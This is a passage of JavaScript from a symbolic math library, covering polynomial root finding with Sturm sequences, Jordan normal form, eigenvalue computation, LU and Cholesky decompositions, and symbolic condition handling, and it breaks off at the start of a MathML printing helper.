          b = middle;
        } else if (v.compareTo(Expression.ZERO) === pa.compareTo(Expression.ZERO)) {
          a = middle;
        } else {
          a = middle;
          b = middle;
        }
      }
      //console.log(cc);
      a = a.divide(e);
      b = b.divide(e);
    }
    return {a: a, b: b};
  };

  //var gcd = function (a, b) {
  //  return b.getDegree() === -1 ? a : gcd(b, a.divideAndRemainder(b).remainder);
  //};
  
  var gcd = function (a, b) {
    return b.getDegree() === -1 ? a : Polynomial.polynomialGCD(a, b);
  };

  Polynomial.prototype.hasRoot = function (polynomialRoot) {
    var f = this;
    var p = polynomialRoot.polynomial;
    var g = gcd(f, p);
    if (g.getDegree() < 1) {
      return false;
    }
    var i = polynomialRoot.interval;
    var sturmSequence = new SturmSequence(g);
    return sturmSequence.numberOfRoots(i) === 1;
  };

  Polynomial.prototype.hasIntegerCoefficients = function () {
    //TODO: optimize
    for (var i = 0; i <= this.getDegree(); i += 1) {
      if (!(this.getCoefficient(i) instanceof Expression.Integer)) {
        return false;
      }
    }
    return true;
  };

  //TODO: optimize - ?
  var _countMultiplicities = function (multiplicities, rootIntervals, f) {
    var d = f.derive();
    var g = gcd(f, d);
    var p = f.divideAndRemainder(g).quotient;
    //!
    p = p.scale(p.getContent().inverse());
    //!
    var sturmSequence = new SturmSequence(p);
    for (var i = 0; i < rootIntervals.length; i += 1) {
      if (sturmSequence.numberOfRoots(rootIntervals[i]) === 1) {
        multiplicities[i] += 1;
      }
    }
    if (g.getDegree() > 0) {
      _countMultiplicities(multiplicities, rootIntervals, g);
    }
  };

  // Polynomial.toPolynomial("x^3-8x^2+21x-18").getZeros();
  Polynomial.prototype.getZeros = function (precision) {
    //TODO: test
    var content = this.getContent();
    var f = this.scale(content.getDenominator()).divideAndRemainder(Polynomial.of(content.getNumerator()), "throw").quotient;

    if (!f.hasIntegerCoefficients()) {
      //return [];
      return {result: [], multiplicities: []};
    }

    // https://en.wikipedia.org/wiki/Square-free_polynomial
    var d = f.derive();
    var a0 = gcd(f, d);
    var p = f.divideAndRemainder(a0).quotient;
    
    //!
    p = p.scale(p.getContent().inverse());
    //!

    // https://en.wikipedia.org/wiki/Sturm%27s_theorem
    var sturmSequence = new SturmSequence(p);
    var intervals = sturmSequence.getRootIntervals();
    
    // https://math.stackexchange.com/questions/309178/polynomial-root-finding
    // "it is guaranteed that there is a sign change inside every interval (because there are no repeated zeroes)"
    var result = new Array(intervals.length);
    for (var i = 0; i < intervals.length; i += 1) {
      var zero = p.getZero(intervals[i], precision);
      if (zero.a.equals(zero.b)) {
        result[i] = zero.a;//TODO: fix
      } else {
        //! p, not f, as f may have roots with multiplicity > 1
        var root = new PolynomialRoot(p, zero);
        result[i] = new ExpressionWithPolynomialRoot(root, root);
      }
    }
    //return result;

    //?
    var multiplicities = new Array(intervals.length);
    for (var i = 0; i < intervals.length; i += 1) {
      multiplicities[i] = 1;
    }
    _countMultiplicities(multiplicities, intervals, a0);

    return {result: result, multiplicities: multiplicities};
  };

})();
(function () {
"use strict";



// https://ca.wikipedia.org/wiki/Forma_canònica_de_Jordan

// https://es.wikipedia.org/wiki/Forma_canónica_de_Jordan

Expression.getFormaDeJordan = function (matrix, eigenvalues, multiplicities, hack) {
  function getSolutionSet(matrix) {
    var fullMatrix = matrix.augment(Matrix.Zero(matrix.cols(), 1));
    var result = fullMatrix.toRowEchelon(Matrix.GaussMontante, "solving", undefined);
    var tmp = Matrix.solveByGaussNext(result.matrix);
    var currentEigenvectors = Matrix.getSolutionSet(tmp).basisVectors;
    return currentEigenvectors;//?
  }
  function matrixFromBlocks(blocks) {
    var start = 0;
    var J = Matrix.Zero(n, n);
    for (var i = 0; i < blocks.length; i += 1) {
      var b = blocks[i];
      J = J.map(function (e, i, j) {
        if (i >= start && i < start + b.size) {
          return i === j ? b.eigenvalue : (i !== start + b.size - 1 && j === i + 1 ? Expression.ONE : Expression.ZERO);
        }
        return e;
      });
      start += b.size;
    }
    return J;
  }
  function matrixFromBasis(basis) {
    if (basis.length === 0) {
      throw new TypeError();
    }
    return Matrix.Zero(basis.length, basis[0].rows()).map(function (e, i, j) {
      return basis[i].e(j, 0);
    });
  }
  function isSolution(coefficientMatrix, vector) {
    var f = coefficientMatrix.multiply(vector);
    if (f.cols() !== 1) {
      throw new RangeError("assertion failed");
    }
    for (var i = 0; i < f.rows(); i += 1) {
      if (!f.e(i, 0).equals(Expression.ZERO)) {
        return false;
      }
    }
    return true;
  }
  function isLinearlyIndependentSet(basis, vectors) {
    // https://math.stackexchange.com/questions/412563/determine-if-vectors-are-linearly-independent
    return matrixFromBasis(basis.concat(vectors)).rank() === basis.length + vectors.length;
  }

  //!TODO: remove
  if (eigenvalues.length === matrix.rows()) {
    var eigenvectors = Expression.getEigenvectors(matrix, eigenvalues).eigenvectors;
    var tmp = Expression.diagonalize(matrix, eigenvalues, multiplicities, eigenvectors);
    var P = tmp.T;
    var J = tmp.L;
    var P_INVERSED = tmp.T_INVERSED;
    //console.log("P=" + P.toString() + ", J=" + J.toString());
    return {
      P: P,
      J: J,
      P_INVERSED: P_INVERSED
    };
  }
  //!

  var A = matrix;
  var n = A.rows();

  var basis = [];
  var blocks = [];
  for (var i = 0; i < eigenvalues.length; i += 1) {
    // https://en.wikipedia.org/wiki/Generalized_eigenvector#Computation_of_generalized_eigenvectors
    var basisCorrespondingToTheEigenvalue = []; // TODO: optimize (n**3 -> n**2)
    var eigenvalue = eigenvalues[i];
    var algebraicMultiplicity = multiplicities[i];
    var B = A.subtract(Matrix.I(n).scale(eigenvalue));
    var m = 1;
    while (B.pow(m).rank() > n - algebraicMultiplicity) {
      m += 1;
    }
    m += 1;
    while (--m >= 1) {
      //var z = 0;
      //var pm = B.pow(m - 1).rank() - 2 * B.pow(m).rank() + B.pow(m + 1).rank();
      var solutionSet = getSolutionSet(B.pow(m));  // "kernel of A"
      for (var j = 0; j < solutionSet.length; j += 1) {
        var solution = solutionSet[j];
        //if (z < pm) {
        //console.log(B.pow(m).augment(solution).rank(), m, n);
        if (!isSolution(B.pow(m - 1), solution)) {
          var chain = [];
          var s = solution;
          for (var k = 0; k < m; k += 1) {
            chain.push(s);
            s = B.multiply(s);
          }
          chain.reverse();
          if (isLinearlyIndependentSet(basisCorrespondingToTheEigenvalue, chain)) {
            //z += 1;
            basis = basis.concat(chain);
            basisCorrespondingToTheEigenvalue = basisCorrespondingToTheEigenvalue.concat(chain);
            blocks.push({
              size: m,
              eigenvalue: eigenvalue
            });
          }
        }
        //}
      }
    }
  }
  var J = matrixFromBlocks(blocks);
  if (basis.length !== n) {
    throw new RangeError("assertion failed");
  }
  var P = matrixFromBasis(basis).transpose();
  //console.log("P=" + P.toString() + ", J=" + J.toString());
  //var P_INVERSED = P.inverse();
  var P_INVERSED = P.isExact() ? P.inverse() : (hack ? null : getInverse(A, eigenvalues, multiplicities, P));
  if (!hack && P.isExact()) {
  if (A.toString() !== P.multiply(J).multiply(P_INVERSED).toString()) {
    throw new RangeError("assertion failed");
  }
  }
  return {
    P: P,
    J: J,
    P_INVERSED: P_INVERSED
  };
};

// A = P*J*P^-1
// A^T = (P^-1)^T*J^T*P^T
// Note:
// (0 0 0 1)         (0 0 0 1)
// (0 0 1 0)         (0 0 1 0)
// (0 1 0 0) * J^T * (0 1 0 0) = J
// (1 0 0 0)         (1 0 0 0)
// where on the left we are doing row spaws, then doing column swaps.
// Note: the inverse of the anti-diagonal unitary matrix is the matrix itself.
// A^T = X*Y*X^-1
// (P^-1)^T*J^T*P^T = X*Y*X^-1
// (P^-1)^T*B^-1*J*B*P^T = X*Y*X^-1
// Then P^-1 = (X*B)^T .

var getInverse = function (A, eigenvalues, multiplicities, P) {
  // https://en.wikipedia.org/wiki/Diagonalizable_matrix : The row vectors of P^−1 are the left eigenvectors of A
  // https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors#Left_and_right_eigenvectors :  a left eigenvector of A is the same as the transpose of a right eigenvector of A^T, with the same eigenvalue
  var AT = A.transpose();
  var tmp2 = Expression.getFormaDeJordan(AT, eigenvalues, multiplicities, true);
  var J = tmp2.J;
  var X = tmp2.P;

  var n = A.cols();
  var B = Matrix.Zero(n, n).map(function (e, i, j) {
    function getCurrentBlock() {
      var s = i;
      while (s - 1 >= 0 && s < n && J.e(s - 1, s).equals(Expression.ONE)) {
        s -= 1;
      }
      var e = i;
      while (e + 1 < n && J.e(e, e + 1).equals(Expression.ONE)) {
        e += 1;
      }
      return {s: s, e: e};
    }
    var tmp = getCurrentBlock();
    return tmp.s + tmp.e === i + j ? Expression.ONE : Expression.ZERO;
  });

  var P_INVESRED = X.multiply(B).transpose();
  return Expression._unscaleInverseMatrix(P_INVESRED, P);
};
Expression._getInverse = getInverse;

})();
(function () {
"use strict";



  
Expression.getPolynomialRootsWithSteps = function (polynomial, fractionDigits, callback) {
  var roots = polynomial.getroots(callback);

  //TODO: tests
  //!2018-05-28
  //!2018-07-11
  // experimental code
  var zeros = {result: [], multiplicities: []};
  if (typeof polynomial.getZeros === "function" && roots.length !== polynomial.getDegree()) {
    var p = Polynomial.of(Expression.ONE);
    for (var i = 0; i < roots.length; i += 1) {
      p = p.multiply(Polynomial.of(roots[i].negate(), Expression.ONE));
    }
    var r = polynomial.divideAndRemainder(p).quotient;
    var precision = Math.max(fractionDigits || 0, 5);
    zeros = r.getZeros(precision);
  }
  //!

  // removing of duplicates
  var uniqueRoots = [];
  var multiplicities = [];
  for (var i = 0; i < roots.length; i += 1) {
    var root = roots[i];
    var isDuplicate = false;
    var j = -1;
    while (++j < uniqueRoots.length) {
      if (uniqueRoots[j].equals(root)) {
        isDuplicate = true;
        multiplicities[j] += 1;
      }
    }
    if (!isDuplicate) {
      uniqueRoots.push(root);
      multiplicities.push(1);
    }
  }

  uniqueRoots = uniqueRoots.concat(zeros.result);
  multiplicities = multiplicities.concat(zeros.multiplicities);

  return {
    uniqueRoots: uniqueRoots,
    multiplicities: multiplicities
  };
};

Expression.getEigenvalues = function (matrix, fractionDigits, callback) {

  if (!matrix.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }
  // TODO: remove Polynomial

  var determinant = matrix.map(function (e, i, j) {
    var p = i === j ? Polynomial.of(e, Expression.ONE.negate()) : (e.equals(Expression.ZERO) ? Polynomial.ZERO : Polynomial.of(e));
    return new Expression.Polynomial(p);
  }).determinant();
  determinant = determinant.polynomial;

  //!new (sin/cos)
  //TODO: fix
  determinant = determinant.map(function (e) { return e.simplifyExpression(); });

  var characteristicPolynomial = determinant;//!TODO: fix

  var tmp = Expression.getPolynomialRootsWithSteps(characteristicPolynomial, fractionDigits, callback);
  var uniqueRoots = tmp.uniqueRoots;
  var multiplicities = tmp.multiplicities;

  var eigenvalues = uniqueRoots;
  return {
    characteristicPolynomial: characteristicPolynomial,
    eigenvalues: eigenvalues,
    multiplicities: multiplicities
  };
};

Expression.getEigenvectors = function (matrix, eigenvalues) {
  var eigenvectors = [];
  for (var i = 0; i < eigenvalues.length; i += 1) {
    var n = matrix.cols();
    // matrix - E * eigenvalue
    var fullMatrix = matrix.subtract(Matrix.I(n).scale(eigenvalues[i])).augment(Matrix.Zero(n, 1));
    //TODO: Matrix.GaussMontante
    var result = fullMatrix.toRowEchelon(Matrix.GaussJordan, "solving", undefined);
    var tmp = Matrix.solveByGaussNext(result.matrix);
    var currentEigenvectors = Matrix.getSolutionSet(tmp).basisVectors;
    eigenvectors = eigenvectors.concat(currentEigenvectors);//?
  }
  return {
    eigenvectors: eigenvectors
  };
};

var getInverse = function (A, eigenvalues, T) {
  // https://en.wikipedia.org/wiki/Diagonalizable_matrix : The row vectors of P^−1 are the left eigenvectors of A
  // https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors#Left_and_right_eigenvectors :  a left eigenvector of A is the same as the transpose of a right eigenvector of A^T, with the same eigenvalue
  var AT = A.transpose();
  var tmp2 = Expression.getEigenvectors(AT, eigenvalues);
  var eigenvectors = tmp2.eigenvectors;
  var T_INVERSED = Matrix.I(AT.cols()).map(function (e, i, j) {
    return eigenvectors[i].e(j, 0);
  });
  return _unscaleInverseMatrix(T_INVERSED, T);
};

var _unscaleInverseMatrix = function (T_INVERSED, T) {
  // we know, that the result is {{s_1, 0, 0, 0}, {0, s_2, 0, 0}, {0, 0, s_3, 0}, {0, 0, 0, s_4}}
  var trickyMultiply = function (a, b) {
    var n = a.rows();
    return Matrix.Zero(n, n).map(function (element, i, j) {
      if (i !== j) {
        return Expression.ZERO;
      }
      var rows = n;
      var k = -1;
      while (++k < rows) {
        var current = a.e(i, k).multiply(b.e(k, j));
        element = k === 0 ? current : element.add(current);
      }
      return element;
    });
  };

  var S = trickyMultiply(T_INVERSED, T);
  var S_INVERSED = S.map(function (e, i, j) {
    return i === j ? e.inverse() : Expression.ZERO;
  });

  return S_INVERSED.multiply(T_INVERSED);
};
Expression._unscaleInverseMatrix = _unscaleInverseMatrix;//TODO: make private

// A = T^-1 L T ,T-matrix of own vectors, L - matrix of own values

Expression.diagonalize = function (matrix, eigenvalues, multiplicities, eigenvectors) {
  if (!matrix.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }
  if (Expression.sum(multiplicities) !== matrix.cols()) {
    throw new RangeError();
  }
  if (eigenvectors.length !== matrix.cols()) {
    throw new RangeError();
  }
  // https://en.wikipedia.org/wiki/Jordan_normal_form
  // A is diagonalizable if and only if, for every eigenvalue λ of A, its geometric and algebraic multiplicities coincide.

  // TODO: text
  //!!!  
  var getEigenvalue = function (i) {
    var eigenvalueIndex = -1;
    var s = i;
    while (s >= 0) {
      s -= multiplicities[eigenvalueIndex + 1];
      eigenvalueIndex += 1;
    }
    return eigenvalues[eigenvalueIndex];
  };
  var L = Matrix.I(matrix.cols()).map(function (element, i, j) {
    return (i === j ? getEigenvalue(i) : Expression.ZERO);
  });
  var T = Matrix.I(matrix.cols()).map(function (e, i, j) {
    return eigenvectors[j].e(i, 0);
  });

  //var T_INVERSED = T.inverse();
  var T_INVERSED = T.isExact() ? T.inverse() : getInverse(matrix, eigenvalues, T);

  return {T: T, L: L, T_INVERSED: T_INVERSED};
};

Expression.LUDecomposition = function (matrix) {
  //TODO: remove(?) - matrix.toRowEchelon(...)
  var N = matrix.rows();
  var a = matrix;
  var Lower = Matrix.I(N);
  var P = Matrix.I(N);
  var swapFlag = false;
  var pivotRow = 0;
  for (var n = 0; n < matrix.cols(); n += 1) {
    if (pivotRow < N) {
      var c = pivotRow;
      if (a.e(pivotRow, n).equals(Expression.ZERO)) {
        for (var k = pivotRow + 1; k < N && c === pivotRow; k += 1) {
          if (!a.e(k, n).equals(Expression.ZERO)) {
            c = k;
          }
        }
        if (c !== pivotRow) {
          var S = Matrix.I(N);
          S = S.map(function (element, i, j) {
            return i === pivotRow ? S.e(c, j) : (i === c ? S.e(pivotRow, j) : element);
          });
          a = S.multiply(a);
          Lower = S.multiply(Lower.subtract(Matrix.I(N))).add(Matrix.I(N));
          P = P.multiply(S);
          swapFlag = true;
        }
      }
      if (!a.e(pivotRow, n).equals(Expression.ZERO)) {
        var L = Matrix.I(N).map(function (element, i, j) {
          return j === pivotRow && i >= pivotRow + 1 ? a.e(i, n).divide(a.e(pivotRow, n)).negate() : element;
        });
        a = L.multiply(a);
        Lower = Lower.multiply(L);
        pivotRow += 1;
      }
    }
  }
  Lower = Lower.map(function (element, i, j) {
    return i === j ? element : element.negate();
  });
  return {
    swapFlag: swapFlag,
    P: new Expression.Matrix(P),
    A: new Expression.Matrix(matrix),
    L: new Expression.Matrix(Lower),
    U: new Expression.Matrix(a)
  };
};

Expression.isRealMatrix = function (A, n) {
  var isReal = function (e) {
    if (e instanceof Expression.Integer) {
      return true;
    }
    if (e instanceof Expression.NthRoot) {
      return isReal(e.a);
    }
    if (e instanceof Expression.BinaryOperation) {
      return isReal(e.a) && isReal(e.b);
    }
    return false;
  };
  for (var i = 0; i < n; i += 1) {
    for (var j = 0; j < n; j += 1) {
      if (!isReal(A.e(i, j))) {
        return false;
      }
    }
  }
  return true;
};

Expression.CholeskyDecomposition = function (matrix) {
  var A = matrix;

  // check if A is square
  if (!A.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }

  var n = A.rows();

  // check if A from R
  if (!Expression.isRealMatrix(A, n)) {
    throw new RangeError("NonRealMatrixException");
  }

  // check if A is symmetric
  for (var i = 0; i < n; i += 1)  {
    for (var j = i + 1; j < n; j += 1) {
      if (!A.e(i, j).equals(A.e(j, i))) {
        throw new RangeError("NonSymmetricMatrixException");
      }
    }
  }

  var L = new Array(n);
  for (var i = 0; i < n; i += 1) {
    L[i] = new Array(n);
    for (var j = 0; j < n; j += 1) {
      L[i][j] = Expression.ZERO;
    }
  }

  for (var j = 0; j < n; j += 1) {
    for (var i = j; i < n; i += 1) {
      var e = null;
      if (j === i) {
        var sum = null;
        for (var k = 0; k < j; k += 1) {
          var s = L[j][k].pow(Expression.TWO);
          sum = sum == null ? s : sum.add(s);
        }
        var x = sum == null ? A.e(j, j) : A.e(j, j).subtract(sum);
        //TODO: fix
        //if (x instanceof Expression.Integer && x.compareTo(Expression.ZERO) < 0) {
        //  throw new RangeError("NonPositiveDefiniteMatrix");
        //}
        e = x.squareRoot();
      } else {
        var sum = null;
        for (var k = 0; k < j; k += 1) {
          var x = L[i][k].multiply(L[j][k]);
          sum = sum == null ? x : sum.add(x);
        }
        e = (sum == null ? A.e(i, j) : A.e(i, j).subtract(sum)).divide(L[j][j]);
      }
      L[i][j] = e;
      console.log("l_%d%d = %s", i + 1, j + 1, L[i][j].toString());
    }
  }
  return {
    L: Matrix.padRows(L, null)
  };
};



})();
(function () {
"use strict";



function Condition(array) {
  this.array = array;
}

Condition.NEZ = " != 0";
Condition.EQZ = " == 0";

Condition.prototype._and = function (operator, e) {
  if (operator !== Condition.NEZ && operator !== Condition.EQZ) {
    throw new TypeError();
  }
  if (e == undefined) {
    throw new RangeError();
  }
  if (this === Condition.FALSE) {
    return this;
  }
  if (e instanceof Expression.GF2Value) {
    return this._and(operator, e.value);//?
  }
  if (e instanceof Expression.NthRoot) {
    return this._and(operator, e.a);
  }
  if (e instanceof Expression.Integer || e instanceof Expression.Complex) {
    if (e.equals(Expression.ZERO)) {
      if (operator === Condition.NEZ) {
        return Condition.FALSE;
      }
      return this;
    }
    if (operator === Condition.EQZ) {
      return Condition.FALSE;
    }
    return this;
  }
  if (operator === Condition.NEZ) {
    if (e instanceof Expression.Multiplication) {
      return this._and(Condition.NEZ, e.a)._and(Condition.NEZ, e.b);
    }
  }
  if (e instanceof Expression.Division) {
    return this._and(operator, e.a)._and(Condition.NEZ, e.b);
  }
  if (Expression.isConstant(e)) {
    if (operator === Condition.NEZ) {
      return this;
    }
    if (operator === Condition.EQZ) {
      return Condition.FALSE;
    }
  }
  var contains = function (array, operator, e) {
    for (var i = 0; i < array.length; i += 1) {
      if (array[i].operator === operator && array[i].expression.equals(e)) {
        return true;
      }
    }
    return false;
  };
  if (contains(this.array, operator, e)) {
    return this;
  }
  if (contains(this.array, operator === Condition.EQZ ? Condition.NEZ : Condition.EQZ, e)) {
    return Condition.FALSE;
  }
  if (e instanceof Expression.Exponentiation &&
      e.b instanceof Expression.Integer &&
      e.b.compareTo(Expression.ZERO) > 0 &&
      e.a instanceof Expression.Symbol) {
    return this._and(operator, e.a);
  }

  var add = function (oldArray, y) {
    var e = y.expression;//!

    //!new
    if (e.isNegative()) {
      return add(oldArray, {expression: e.negate(), operator: y.operator});
    }

    // (x-1)^(1/2)
    if (e instanceof Expression.Exponentiation &&
        e.b.getNumerator() instanceof Expression.Integer &&
        !e.b.getDenominator().equals(Expression.ONE)) {
      return add(oldArray, {expression: e.a, operator: y.operator});
    }

    // (4*k+1)^(1/2)+1
    if (e instanceof Expression.Addition &&
        e.a instanceof Expression.Exponentiation &&
        Expression.isConstant(e.b) && //!
        e.a.b.getDenominator() instanceof Expression.Integer &&
        !e.a.b.getDenominator().equals(Expression.ONE)) {
      if (e.a.b.getDenominator().remainder(Expression.TWO).equals(Expression.ZERO) && !e.b.isNegative()) {
        return add(oldArray, {expression: Expression.ONE, operator: y.operator});
      }
      //if (!e.b.negate().pow(e.a.b.inverse()).pow(e.a.b).equals(e.b.negate())) {
      //  return add(oldArray, {expression: Expression.ONE, operator: y.operator});
      //}
      //TODO: fix
      return add(oldArray, {expression: e.a.a.pow(e.a.b.getNumerator()).subtract(e.b.negate().pow(e.a.b.getDenominator())), operator: y.operator});
    }

    if (y.expression instanceof Expression.Multiplication && y.expression.b instanceof Expression.IdentityMatrix) {
      return add(oldArray, {expression: y.expression.a, operator: y.operator});
    }
    if (y.expression instanceof Expression.Division) {
      var tmp = oldArray;
      tmp = add(tmp, {expression: y.expression.a, operator: y.operator});
      if (tmp == null) {
        return null;
      }
      tmp = add(tmp, {expression: y.expression.b, operator: Condition.NEZ});
      return tmp;
    }
    /*if (y.expression instanceof Expression.Division && Expression.isConstant(y.expression.b)) {
      y = {
        expression: y.expression.a,
        operator: y.operator
      };
    }*/
    if (y.expression instanceof Expression.Integer || y.expression instanceof Expression.Complex) {
      if (y.operator === Condition.NEZ && y.expression.equals(Expression.ZERO) ||
          y.operator === Condition.EQZ && !y.expression.equals(Expression.ZERO)) {
        return null;
      }
      return oldArray;
    }
    //TODO: check code coverage, remove extra branches
    if (Expression.isConstant(y.expression) && !y.expression.equals(Expression.ZERO)) {
      if (y.operator === Condition.NEZ) {
        return oldArray;
      }
      if (y.operator === Condition.EQZ) {
        return null;
      }
    }
    if (y.expression instanceof Expression.NthRoot) {
      return add(oldArray, {expression: y.expression.a, operator: y.operator});
    }
    if (y.expression instanceof Expression.Multiplication) {
      if (y.operator === Condition.EQZ) {
        if (y.expression.a instanceof Expression.Integer && !y.expression.a.equals(Expression.ZERO)) {
          //TODO: fix - ?
          y = {
            expression: y.expression.b,
            operator: y.operator
          };
        }
      }
      if (y.operator === Condition.NEZ) {
        var tmp = oldArray;
        tmp = add(tmp, {expression: y.expression.a, operator: Condition.NEZ});
        if (tmp == null) {
          return null;
        }
        tmp = add(tmp, {expression: y.expression.b, operator: Condition.NEZ});
        return tmp;
      }
    }

    var p = Expression.getMultivariatePolynomial(y.expression);
    if (p != null) {
      var content = p.p.getContent();
      if (!content.equals(Expression.ONE) && !content.equals(Expression.ONE.negate())) {
        // content * y.expression.divide(content)
        if (operator === Condition.NEZ) {
          var tmp = add(oldArray, {expression: y.expression.divide(content), operator: Condition.NEZ});
          if (tmp == null) {
            return null;
          }
          return add(tmp, {expression: content, operator: Condition.NEZ});
        }
        while (p != null) {
          content = p.p.getContent();
          p = Expression.getMultivariatePolynomial(content);
        }
        y = {
          expression: y.expression.divide(content),
          operator: y.operator
        };
      }
      if (p != null && p.p.getDegree() > 1 && p.p.getCoefficient(0).equals(Expression.ZERO)) {
        if (operator === Condition.NEZ) {
          var tmp = add(oldArray, {expression: p.v, operator: Condition.NEZ});
          if (tmp == null) {
            return null;
          }
          return add(tmp, {expression: y.expression.divide(p.v), operator: Condition.NEZ});
        }
      }
    }

    var newArray = [];
    for (var i = 0; i < oldArray.length; i += 1) {
      var x = oldArray[i];
      if ((x.operator === Condition.NEZ && y.operator === Condition.EQZ ||
           x.operator === Condition.EQZ && y.operator === Condition.NEZ) &&
           Expression.isSingleVariablePolynomial(x.expression.multiply(y.expression))) {
        var g = x.expression.gcd(y.expression);
        while (!g.equals(Expression.ONE) && !g.equals(Expression.ONE.negate())) {
          if (x.operator === Condition.EQZ) {
            x = {
              operator: x.operator,
              expression: x.expression.divide(g)
            };
          } else {
            y = {
              operator: y.operator,
              expression: y.expression.divide(g)
            };
          }
          g = x.expression.gcd(y.expression);
        }
        if (x.operator === Condition.EQZ) {
          var tmp = y;
          y = x;
          x = tmp;
        }
        if (Expression.isConstant(y.expression)) {
          return null;
        }
        //if (!Expression.isSingleVariablePolynomial(x.expression.multiply(y.expression))) {
        //  newArray.push(x);
        //}
      }
      if (x.operator === Condition.NEZ && y.operator === Condition.EQZ && Expression.isSingleVariablePolynomial(x.expression.multiply(y.expression))) {
        y = y;
      } else if (x.operator === Condition.EQZ && y.operator === Condition.EQZ && Expression.isSingleVariablePolynomial(x.expression.multiply(y.expression))) {
        var g = x.expression.gcd(y.expression);
        if (g instanceof Expression.Integer) {
          return null;
        }
        y = {
          operator: y.operator,
          expression: g
        };
      } else if (Expression.isSingleVariablePolynomial(x.expression.multiply(y.expression))) {
        // TODO: both Condition.NEZ - ?
        var g = x.expression.gcd(y.expression);
        x = {
          operator: x.operator,
          expression: x.expression.divide(g)
        };
        if (!Expression.isConstant(x.expression)) {
          newArray.push(x);
        }
      } else { // !isSingleVariablePolynomial
        var p = null;
        var pOperator = null;
        var pp = null;
        var other = null;
        var px = Expression.getMultivariatePolynomial(x.expression);
        var py = Expression.getMultivariatePolynomial(y.expression);
        //var xy = Expression.getMultivariatePolynomial(x.expression.multiply(y.expression));

        //console.assert(px != null && py != null);

        if (//xy != null &&
            //x.operator === Condition.EQZ &&
            //y.operator === Condition.EQZ &&
            px != null && py != null) {

          //if (px != null && px.p.getDegree() !== 1 && py == null) {
            //py = {p: Polynomial.toPolynomial(y.expression, px.v), v: px.v};
            //if (xy.v === py.v) {
            //  py = null;
            //}
          //}
          //if (px == null && py != null && py.p.getDegree() !== 1) {
            //px = {p: Polynomial.toPolynomial(x.expression, py.v), v: py.v};
            //if (xy.v === px.v) {
            //  px = null;
            //}
          //}
          //if (px == null && py == null) {//?TODO:
          //  px = {p: Polynomial.toPolynomial(x.expression, xy.v), v: xy.v};
          //  py = {p: Polynomial.toPolynomial(y.expression, xy.v), v: xy.v};
          //}

          if (x.operator === Condition.EQZ && px != null && px.p.getDegree() === 1 && y.operator === Condition.EQZ && py != null && py.p.getDegree() === 1) {
            if (px.v.symbol < py.v.symbol) {//!
              px = null;
            }
          }

          if (y.operator === Condition.EQZ && py != null && py.p.getDegree() === 1) {
            pp = py;
            p = x.expression;
            pOperator = x.operator;
            other = y;
          }
          if (x.operator === Condition.EQZ && px != null && px.p.getDegree() === 1) {
            pp = px;
            p = y.expression;
            pOperator = y.operator;
            other = x;
          }
        }
        if (pp != null) {
          var polynomial = Polynomial.toPolynomial(p, pp.v);
          var a = polynomial.calcAt(pp.p.getCoefficient(0).negate().divide(pp.p.getCoefficient(1)));
          if (!a.equals(p) && (a.getDenominator() instanceof Expression.Integer)) {
            var tmp = {
              operator: pOperator,
              expression: a
            };
            newArray = add(newArray, tmp);
            if (newArray == null) {
              return null;
            }
            if (true) {
              newArray = add(newArray, other);
              if (newArray == null) {
                return null;
              }
              for (var j = i + 1; j < oldArray.length; j += 1) {
                newArray = add(newArray, oldArray[j]);
                if (newArray == null) {
                  return null;
                }
              }
              return newArray;
            } else {
              y = other;
            }
          } else {
            newArray.push(x);
          }
        } else {
          newArray.push(x);
        }
      }
    }
    newArray.push(y);
    return newArray;
  };
  var newArray = add(this.array, {
    operator: operator,
    expression: e
  });
  if (newArray == null) {
    return Condition.FALSE;
  }
  if (newArray.length === 0) {
    return Condition.TRUE;
  }
  
  return new Condition(newArray);
};

Condition.prototype.andNotZero = function (e) {
  return this._and(Condition.NEZ, e);
};
Condition.prototype.andZero = function (e) {
  return this._and(Condition.EQZ, e);
};
Condition.prototype.isFalse = function () {
  return this === Condition.FALSE;
};
Condition.prototype.isTrue = function () {
  return this === Condition.TRUE;
};
Condition.prototype.toString = function (options) {
  if (this === Condition.TRUE || this === Condition.FALSE) {
    // 1) no need; 2) no way to distinguish TRUE and FALSE
    throw new TypeError();
  }
  if (this.array.length === 0) {
    // assertion
    throw new TypeError();
  }
  var s = '';
  for (var i = 0; i < this.array.length; i += 1) {
    s += (i !== 0 ? ', ' : '') + this.array[i].expression.toString(options) + (this.array[i].operator === Condition.NEZ ? ' != 0' : '') + (this.array[i].operator === Condition.EQZ ? ' == 0' : '');
  }
  return s;
};

Condition.TRUE = new Condition(new Array(0));
Condition.FALSE = new Condition(undefined);

self.Condition = Condition;

})();
(function () {
"use strict";


//TODO:
//TODO:
//TODO:

//TODO: remove - ?



//!TODO: remove
Polynomial.prototype.toString = function (options) {
  options = options || {};
  return this.toExpression(options.polynomialVariable || (new Expression.Symbol("x"))).toString(options);
};
Polynomial.prototype.toMathML = function (options) {
  options = options || {};
  return this.toExpression(options.polynomialVariable || (new Expression.Symbol("x"))).toMathML(options);
};
Expression.Polynomial.prototype.toString = function (options) {
  return this.polynomial.toString(options);
};
Expression.Polynomial.prototype.toMathML = function (options) {
  return this.polynomial.toMathML(options);
};

// coefficient - Expression
// variable - Expression
var printPartOfAddition = function (isLast, isFirst, coefficient, variable, options) {
  if (coefficient.equals(Expression.ZERO)) {
    return (isLast && isFirst ? "<mn>0</mn>" : "");
  }
  var isNegative = false;
  if (coefficient.isNegative() && !isFirst) {
    isNegative = true;
    coefficient = coefficient.negateCarefully();//?
  }
  var precedenceOfMultiptication = new Expression.Multiplication(Expression.ZERO, Expression.ZERO).getPrecedence();
  var areBracketsRequired = coefficient.getPrecedence() < precedenceOfMultiptication; //?
  var c = coefficient.equals(Expression.ONE);
  //TODO: fix
  return (isFirst ? '' : '') +
         (!isFirst && isNegative ? '<mo form="infix">&minus;</mo>' : '') +
         (!isFirst && !isNegative ? '<mo form="infix">+</mo>' : '') +
         (c ? '' : '<mrow>') +
         (c || !areBracketsRequired ? '' : '<mrow><mo>(</mo>') +
         (c ? '' : coefficient.toMathML(options)) +
         (c || !areBracketsRequired ? '' : '<mo>)</mo></mrow>') +
         (c ? '' : '<mo>&times;</mo>') +
         variable.toMathML(options) +
         (c ? '' : '</mrow>');
};


var decimalToMathML = function (sign, number) {
